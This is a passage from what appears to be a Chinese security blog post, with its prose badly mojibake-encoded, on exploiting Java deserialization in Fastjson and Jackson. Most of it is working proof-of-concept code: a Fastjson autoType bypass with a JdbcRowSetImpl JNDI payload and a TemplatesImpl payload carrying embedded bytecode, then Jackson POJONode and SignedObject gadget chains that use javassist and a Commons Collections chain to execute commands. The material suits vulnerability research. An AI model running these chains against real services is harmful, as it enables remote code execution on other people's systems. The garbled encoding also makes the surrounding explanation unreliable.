è½½äº†å¾ˆå¤šç±»ï¼ˆä¸‹å›¾åªæ˜¯éƒ¨åˆ†ï¼‰ï¼š ä¼¼ä¹ä¸å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†å»çœ‹deserializers.findClass()è·å–ç±»çš„æ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°è¿™é‡Œæƒ³è¦è¿”å›clazzçš„è¯æœ‰ä¸€å®šæ¡ä»¶ï¼Œå¹¶ä¸”è¿™é‡Œæ˜¯ä¸IdentityHashMapç±»çš„bucketså˜é‡æœ‰å…³ï¼Œç„¶åçœ‹è¿™é‡Œçš„æ¡ä»¶ï¼Œéœ€è¦keyä¸ºClasså±æ€§ã€‚é‚£ä¹ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™é‡Œdeserializerså˜é‡çš„èµ‹å€¼é€»è¾‘ï¼Œè¿™é‡Œè‚¯å®šå°±æ˜¯ä¸ParserConfigç±»æœ‰å…³äº†ï¼Œè¿™ä¸ªä¹Ÿæ˜¯ä¹‹å‰è¯´çš„å½¢å‚ä¼ é€’çš„ç±»å˜é‡ï¼Œå…·ä½“å¦‚ä¸‹ï¼š\nè°ƒç”¨çš„æ–¹æ³•ï¼š è¿™æ¬¡å°±éœ€è¦è·Ÿè¿›ParserConfigç±»çš„æ„é€ å‡½æ•°äº†ï¼Œä»–çš„æ„é€ å‡½æ•°è°ƒç”¨äº†initDeserializers()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å†…éƒ¨å¯ä»¥çœ‹åˆ°å¦‚ä¸‹å†…å®¹ï¼š\né‡Œé¢è°ƒç”¨äº†å¾ˆå¤šæ–¹æ³•ï¼Œæ³¨æ„å›¾ä¸­ï¼Œæ˜¯æ”¾å…¥äº†ä¸€ä¸ªClass.classçš„é”®ï¼Œçœ‹è¿™ä¸ªå¯¹åº”çš„ç±»ï¼Œä¹‹ç±»å°±æ˜¯è·å–åˆ°è¿™ä¸ªç±»ï¼š\nè€Œè¿™ä¸ªç±»çš„deserialze()æ–¹æ³•å­˜åœ¨ä¸€ä¸ªå­˜åœ¨ä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼š\nè¿™é‡Œä¼šè°ƒç”¨loadClass()æ–¹æ³•ï¼Œå°±æ˜¯æˆ‘ä»¬ä¹‹å‰ç†ŸçŸ¥çš„æ–¹æ³•ï¼Œåœ¨è¿™é‡Œå­˜åœ¨ä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼š è¿™é‡Œçš„cacheé»˜è®¤æ˜¯trueï¼Œæ‰€ä»¥è¿™é‡Œä¼šå°†å¯¹åº”çš„classNameæ”¾è¿›mappingsï¼Œå¹¶ä¸”è¿™é‡Œçš„å‚æ•°æ˜¯å¯æ§çš„ï¼Œä»å‚æ•°ä¼ é€’æ¥çœ‹ï¼Œè¿™é‡Œçš„classNameå°±æ˜¯å‰é¢çš„strValå˜é‡ï¼š\nè€ŒsetValå˜é‡æ˜¯ç”±objValå˜é‡è½¬æ¢æ¥çš„ï¼ŒobjValåˆæ˜¯ä»jsonå­—ç¬¦ä¸²è§£ææ¥çš„ï¼š\næ˜¯ä¸æ˜¯çœ‹åˆ°è¿™é‡Œè¿˜æœ‰ç‚¹æ‡µï¼Œåˆ«æ€¥ï¼Œä¸ºä»€ä¹ˆè¿™é‡Œè¦æåˆ°deserialze()æ–¹æ³•å‘¢ï¼Œå½“æˆ‘ä»¬æ­£å¸¸ååºåˆ—åŒ–æ—¶ï¼ŒåŒæ—¶å…¶å®ä»å‰é¢çš„è°ƒè¯•è¿‡ç¨‹å¯ä»¥çŸ¥é“ï¼Œæ˜¯ä¼šè·å–deserializerå¹¶è°ƒç”¨å®ƒçš„deserialze()æ–¹æ³•ï¼š\næ‰€ä»¥å¯¹åº”çš„ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°è¯•ä¼ å…¥Class.classï¼Œä»è€Œè·å–åˆ°MiscCodecç±»å®ä¾‹ï¼Œä»è€Œè°ƒç”¨åˆ°å®ƒçš„deserialze()æ–¹æ³•ï¼Œä»è€Œå¾€mappingsä¸­æ”¾å…¥æƒ³è¦åˆ©ç”¨çš„ç±»ï¼Œä»è€Œåœ¨ç›´æ¥åœ¨åç»­ä¸­è·å¾—æƒ³è¦çš„ç±»ï¼Œå¦‚ä¸‹ï¼š\næ‰€ä»¥ç»¼ä¸Šä¸Šé¢çš„æ€è·¯ï¼Œéœ€è¦è°ƒç”¨ä¸¤æ¬¡ï¼Œä¸€æ¬¡æ”¾è¿›æŒ‡å®šç±»ï¼Œä¸€æ¬¡åŠ è½½è§¦å‘ååºåˆ—åŒ–ï¼Œå¯ä»¥å°è¯•å¦‚ä¸‹æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class Fastjson_Test{ public static void main(String[] args) throws Exception { String json = \u0026#34;{\\\u0026#34;1\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;},\\\u0026#34;2\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}}\\n\u0026#34;; JSONObject obj = JSON.parseObject(json); } } è¿è¡Œåå¼¹å‡ºè®¡ç®—æœºï¼Œæ³¨æ„æ˜¯æ‰“çš„jndiæ‰“æ³•ã€‚\nè¿™é‡Œçš„ç»†èŠ‚å°±æ˜¯æ²¡æœ‰è®¾ç½®autoTypeSupportï¼Œé»˜è®¤ä¸ºfalseï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªåˆ¤æ–­é»‘åå•çš„å°±ä¸ä¼šè¿›å…¥ï¼š\nè€Œç¬¬äºŒä¸ªåˆ¤æ–­é»‘åå•çš„åœ°æ–¹ä¸ä¼šåˆ°è¾¾ï¼š\nç›´æ¥åœ¨ä¸­é—´å°±æ‰¾åˆ°ç›´æ¥ç»“æŸäº†ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯payloadä¸­ç¬¬äºŒä¸ªå¯ä»¥é‚£æ ·è®¾ç½®çš„åŸå› ã€‚\nTemplatesImplçš„æ‰“æ³•å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; public class Fastjson_Test{ public static void main(String[] args) throws Exception { String json = \u0026#34;{\\\u0026#34;1\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;},\\\u0026#34;2\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}}\\n\u0026#34;; JSONObject obj = JSON.parseObject(json, Feature.SupportNonPublicField); } } è¿è¡Œåå‡å¼¹å‡ºè®¡ç®—æœºã€‚\nç¡®å®å¯ä»¥ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/news/14309\nhttps://nivi4.notion.site/fastjson-873722f1374b4c4e99cc3283a38dfb37\nhttps://tttang.com/archive/1579/#toc_1244\n","date":"2025-04-15T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"fastjsonååºåˆ—åŒ–"},{"content":"jacksonååºåˆ—åŒ–é€šæ€é“¾ å‰é¢ç®€å•äº†è§£äº†ä¸€ä¸‹jacksonååºåˆ—åŒ–ï¼Œå¯ä»¥çŸ¥é“åœ¨åºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨getteræ–¹æ³•ï¼Œè€Œååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨setterï¼Œä½†æ˜¯éƒ½æ˜¯æœ‰ä¸€å®šé™åˆ¶çš„ï¼Œè¿™é‡Œå°±æ¥äº†è§£ä¸€ä¸‹åŸç”Ÿé“¾çš„æ‰“æ³•ã€‚\npom.xmlæ–‡ä»¶ä¸­ä½¿ç”¨çš„ä¾èµ–é¡¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-databind\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.13.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.13.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-annotations\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.13.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; æµ‹è¯•ç¯å¢ƒï¼š\nJDK8u71 å‰ç½® è¿™é‡Œå°±å…ˆæä¾›ä¸€ä¸ªæµ…æ˜¾æ˜“æ‡‚çš„ååºåˆ—åŒ–ä»£ç ï¼Œç„¶åæ¥çœ‹ä¸€ä¸‹è¿™é‡Œçš„ååºåˆ—åŒ–æµç¨‹ï¼Œç®€å•ä»ä¸€ä¸ªåºåˆ—åŒ–çš„è§’åº¦æ¥çœ‹ä¸€ä¸‹è¿™é‡Œçš„æµç¨‹ã€‚\nä»£ç å®šä¹‰å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package jackson; import com.fasterxml.jackson.databind.ObjectMapper; import java.io.IOException; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception { Hacker hacker = new Hacker(); String ow = new ObjectMapper().writeValueAsString(hacker); System.out.println(ow); } } class Hacker { String name2 = \u0026#34;fupanc2\u0026#34;; public Hacker(){ } public String getName(){ try { Runtime.getRuntime().exec(\u0026#34;open -a Calculator\u0026#34;); } catch (IOException e) { throw new RuntimeException(e); } return \u0026#34;fupanc\u0026#34;; } public void setName(String name){ this.name2 = name; } } è¿™é‡Œçš„ä»£ç è¿è¡Œï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚æ‰“æ–­ç‚¹äºwriteValueAsStringæ–¹æ³•è¡Œï¼Œä¸€ç›´è·Ÿè¿›ï¼Œå¯ä»¥å‘ç°æ˜¯åœ¨å¦‚ä¸‹ä»£ç å¤„æˆåŠŸè°ƒç”¨çš„invoke()æ–¹æ³•ä»è€Œè·å–å€¼ï¼š è¿™é‡Œçš„è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\nå¯ä»¥è‡ªå·±å»è·Ÿä¸€ä¸‹\nâ€”â€”â€”â€”â€”â€”\nPOJONodeé“¾ è¿™ä¸ªç±»ä½äºcom.fasterxml.jackson.databind.node.POJONodeï¼Œå®ƒçš„toStringé“¾å¯ä»¥è§¦å‘ä»»æ„çš„getteræ–¹æ³•ã€‚\nå‰é¢éƒ½è¯´äº†æ ¸å¿ƒçš„æ€æƒ³ï¼ŒtoString()æ–¹æ³•è°ƒç”¨ä»»æ„çš„getteræ–¹æ³•ï¼Œé‚£ä¹ˆå¯¹äºgetteræ–¹æ³•ï¼Œæœ€ç»å…¸çš„å°±æ˜¯TemplatesImplçš„åˆ©ç”¨ã€‚æ‰€ä»¥è¿™é‡Œçš„æ€æƒ³è¿˜æ˜¯æƒ³ç€toStringé“¾è°ƒç”¨åˆ°getOutputProperties()æ–¹æ³•ã€‚ç°åœ¨æ¥è·Ÿä¸€ä¸‹çœ‹çœ‹æ€ä¹ˆå®ç°ã€‚\nPOJONodeç±»æ–‡ä»¶æœ¬èº«æ˜¯æ²¡æœ‰å®ç°toString()æ–¹æ³•çš„ï¼Œå…·ä½“çš„å®ç°æ˜¯åœ¨å…¶çˆ¶ç±»çš„çˆ¶ç±»BaseJsonNodeç±»ä¸­ï¼Œä»£ç å†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 public String toString() { return InternalNodeMapper.nodeToString(this); } è¿™é‡Œä¼šè°ƒç”¨InternalNodeMapperç±»çš„nodeToString()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 public static String nodeToString(JsonNode n) { try { return STD_WRITER.writeValueAsString(n); } catch (IOException e) { // should never occur throw new RuntimeException(e); } } writeValueAsString()æ–¹æ³•ï¼Œå¤ªç»å…¸çš„jacksonåºåˆ—åŒ–è°ƒç”¨çš„æ–¹æ³•äº†ï¼Œé‚£ä¹ˆè¿™é‡Œçš„æ¼æ´ç‚¹å°±æ˜¯è¿™é‡Œã€‚å…ˆæ¥çœ‹ä¸€ä¸‹è¿™é‡Œçš„STD_WRITERå˜é‡çš„å®šä¹‰ï¼Œå˜é‡å®šä¹‰å¦‚ä¸‹ï¼š\n1 2 3 private final static JsonMapper JSON_MAPPER = new JsonMapper(); private final static ObjectWriter STD_WRITER = JSON_MAPPER.writer(); è¿™é‡Œåˆ©ç”¨çš„æ˜¯JsonMapperç±»ï¼Œç„¶åè¿™é‡Œçš„STD_WRITERå˜é‡çš„å®šä¹‰æ˜¯JsonMapperç±»çš„writer()æ–¹æ³•çš„è¿”å›å€¼ï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿè¿›ä¸€ä¸‹è¿™é‡Œçš„writer()æ–¹æ³•çš„è°ƒç”¨ï¼Œå‘ç°è¿™é‡ŒJsonMapperå…¶å®å¹¶æ²¡æœ‰å®šä¹‰writer()æ–¹æ³•ï¼Œè¿˜æ˜¯è°ƒç”¨çš„å…¶çˆ¶ç±»ObjectMapperç±»çš„writer()æ–¹æ³•ï¼š\n1 2 3 public ObjectWriter writer() { return _newWriter(getSerializationConfig()); } ç„¶åè°ƒç”¨äº†_newWriter()æ–¹æ³•ï¼š\n1 2 3 protected ObjectWriter _newWriter(SerializationConfig config) { return new ObjectWriter(this, config); } è¿™é‡Œå°±è¿”å›äº†ä¸€ä¸ªObjectWriterç±»å®ä¾‹ã€‚å¹¶ä¸”åœ¨åé¢è¿›è¡Œäº†åºåˆ—åŒ–ï¼Œåœ¨åºåˆ—åŒ–éƒ¨åˆ†æ˜¯é€šè¿‡è°ƒç”¨writeValueAsString()æ–¹æ³•æ¥è¿›è¡Œåºåˆ—åŒ–çš„ï¼Œå¯ä»¥è·Ÿè¿›ä¸€ä¸‹ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public String writeValueAsString(Object value) throws JsonProcessingException { // alas, we have to pull the recycler directly here... SegmentedStringWriter sw = new SegmentedStringWriter(_generatorFactory._getBufferRecycler()); try { _writeValueAndClose(createGenerator(sw), value); } catch (JsonProcessingException e) { throw e; } catch (IOException e) { // shouldn\u0026#39;t really happen, but is declared as possibility so: throw JsonMappingException.fromUnexpectedIOE(e); } return sw.getAndClear(); } ç„¶åæˆ‘å‘ç°ï¼ŒObjectMapperçš„writeValueAsString()æ–¹æ³•ä»£ç é€»è¾‘åŒä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´æ˜å…¶å®è¿™é‡Œå°±æ˜¯è°ƒç”¨ObjectMapperæ¥è¿›è¡Œåºåˆ—åŒ–ï¼Œä¹Ÿå°±æ˜¯å’Œå‰é¢äº†è§£çš„å·®ä¸å¤šäº†ã€‚æ€»çš„æ¥è¯´ï¼Œå°±æ˜¯è¿™é‡Œçš„ObjectMapperæ˜¯å¯ä»¥ç”¨æ¥åŒæ—¶åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ï¼Œä½†æ˜¯ObjectWriteråªæ˜¯ç”¨æ¥åºåˆ—åŒ–çš„ï¼ŒåŒæ—¶æœ‰ä¸€ä¸ªObjectReaderæ¥è¿›è¡Œååºåˆ—åŒ–ï¼š\næ‰€ä»¥å…¶å®éƒ½æ˜¯å·®ä¸å¤šçš„ã€‚\nå¯¹äºè§¦å‘toString()æ–¹æ³•ï¼Œæœ€ç»å…¸çš„å°±æ˜¯CC5äº†ã€‚å¼€å¤´å·²ç»æ‰¾åˆ°äº†ï¼Œé‚£ä¹ˆå¯¹äºPOJONodeç±»ä¹‹é—´çš„æ„é€ è¯¥æ˜¯ä»€ä¹ˆå‘¢ï¼Œæ¥çœ‹ä¸€ä¸‹ä»£ç ä¹‹é—´çš„è”ç³»ï¼š\næˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™é‡Œå¯¹POJONodeç±»è°ƒç”¨toString()æ–¹æ³•ï¼Œå…¶å®å°±æ˜¯å¯¹POJONodeç±»è¿›è¡Œä¸€ä¸ªjsonåºåˆ—åŒ–ï¼Œåºåˆ—åŒ–ï¼Œè‚¯å®šä¼šè°ƒç”¨ç±»çš„å˜é‡ï¼Œä»POJONodeç±»çš„å˜é‡ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‹¿åˆ°å¦‚ä¸‹å†…å®¹ï¼š\næ˜¯çš„ï¼Œè¿™ä¸ª_valueå˜é‡ï¼Œå¹¶ä¸”è¿™ä¸ªå˜é‡çš„å®šä¹‰ä¸ºObjectï¼Œæ‰€ä»¥æ˜¯å¯ä»¥åˆ©ç”¨çš„ã€‚é‚£ä¹ˆè¿™é‡Œè¿˜æ˜¯åˆ©ç”¨TemplatesImplç±»çš„getteræ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œåˆæ¶‰åŠåˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œä¹Ÿæ˜¯å‰é¢romeé“¾æåˆ°äº†ï¼Œè¿™é‡Œçš„getterçš„è·å–ï¼Œè¯¥æ€ä¹ˆå®šä¹‰ï¼Ÿ\nè€ŒTemplatesImplç±»æœ‰å¤šä¸ªgetteræ–¹æ³•ï¼Œæ˜¯å¦æœ‰å½±å“å‘¢ï¼Ÿå…ˆæ„é€ è¯•è¯•çœ‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package jackson; import javax.management.BadAttributeValueExpException; import com.fasterxml.jackson.databind.node.POJONode; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); Object bad = new BadAttributeValueExpException(null); Field field = BadAttributeValueExpException.class.getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, node); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } è™½ç„¶æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œä½†æ˜¯ä»£ç è¿è¡Œä¼šæŠ¥é”™ï¼Œå¹¶ä¸”è°ƒè¯•å¯å¾—è¿™é‡Œå¹¶ä¸æ˜¯ååºåˆ—åŒ–æ—¶å¼¹å‡ºçš„è®¡ç®—æœºï¼Œè€Œæ˜¯åœ¨åºåˆ—åŒ–å°±å¼¹è®¡ç®—æœºäº†ã€‚ç®€å•è·Ÿä¸€ä¸‹ï¼Œå‘ç°è¿™é‡Œæ˜¯ç”±äºBaseJsonNodeç±»å®šä¹‰äº†writeReplace()æ–¹æ³•ï¼Œè€Œå¦‚æœåºåˆ—åŒ–çš„ç±»å®ç°äº†writeReplaceæ–¹æ³•ï¼Œé‚£ä¹ˆå°†ä¼šåœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨å®ƒè¿›è¡Œæ£€æŸ¥ï¼Œæ‰€ä»¥è¿™é‡Œä¼šå‡ºé”™ï¼Œè§£å†³æ–¹æ³•å°±æ˜¯åˆ å»è¿™ä¸ªæ–¹æ³•ï¼Œideaä¸Šçš„æºç ä¸èƒ½ç›´æ¥åˆ é™¤ï¼Œè¿˜å¯ä»¥é‡å†™è¿™ä¸ªç±»æ¥è°ƒç”¨ï¼Œè¿˜å¯ä»¥é€šè¿‡javassistæ¥åœ¨JVMä¸­åŠ¨æ€æ›´æ”¹è¿™ä¸ªç±»çš„æ–¹æ³•ï¼Œæœ€å¥½æ˜¯ä¿®æ”¹å®ƒçš„æ–¹æ³•åï¼Œä¸€åŠ³æ°¸é€¸ï¼Œæœ€åçš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package jackson; import javax.management.BadAttributeValueExpException; import com.fasterxml.jackson.databind.node.POJONode; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //ä¿®æ”¹ç±»æ–¹æ³• CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); ctMethod.setName(\u0026#34;reset\u0026#34;); //ä¹Ÿå¯ä»¥ç›´æ¥åˆ å»è¿™ä¸ªç±» //ctClass.removeMethod(ctMethod); //åŠ è½½ä¿®æ”¹åçš„ç±» ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); //BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Object bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, node); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } è‡³äºåŸå…ˆé”™è¯¯ä»£ç ä¸­ä¸ºä»€ä¹ˆåœ¨åºåˆ—åŒ–ä¹‹å‰å°±ä¼šå¼¹å‡ºè®¡ç®—æœºï¼Œå¯ä»¥è‡ªå·±å»è°ƒè°ƒã€‚\nSignedObjecté“¾ å…¶å®å°±æ˜¯å¥—äº†ä¸€ä¸ªäºŒæ¬¡ååºåˆ—åŒ–é“¾ï¼Œè¿™é‡Œæœ¬æ¥å°±æ˜¯å¯ä»¥è°ƒç”¨getteræ–¹æ³•ï¼Œé‚£ä¹ˆäºŒæ¬¡ååºåˆ—åŒ–å°±é€ƒä¸è„±äº†ã€‚\nä¸å¤šèµ˜è¿°ï¼Œè¿™é‡Œè¿˜æ˜¯äºŒæ¬¡ååºåˆ—åŒ–ä¸€ä¸ªCC6ï¼ŒPOCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 package jackson; import javax.management.BadAttributeValueExpException; import com.fasterxml.jackson.databind.node.POJONode; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.security.KeyPairGenerator; import java.security.KeyPair; import java.lang.reflect.Field; import java.security.Signature; import java.security.SignedObject; public class Main { public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); //ä¿®æ”¹ç±»æ–¹æ³• CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); //ä¹Ÿå¯ä»¥ç›´æ¥åˆ å»è¿™ä¸ªç±» ctClass.removeMethod(ctMethod); ctClass.toClass(); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new 